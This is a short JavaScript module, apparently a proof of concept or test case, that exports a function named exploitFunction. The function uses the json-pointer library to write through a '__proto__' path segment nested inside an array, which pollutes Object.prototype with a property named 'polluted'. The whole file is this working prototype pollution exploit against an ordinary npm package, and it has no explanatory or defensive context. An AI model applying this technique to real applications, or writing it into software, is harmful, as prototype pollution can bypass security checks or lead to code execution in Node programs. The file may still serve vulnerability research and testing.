const pointer = require("json-pointer");

function exploitFunction(payload) {
    pointer.set(payload.obj, [["__proto__"], "polluted"], "yes");
}

module.exports = { exploitFunction };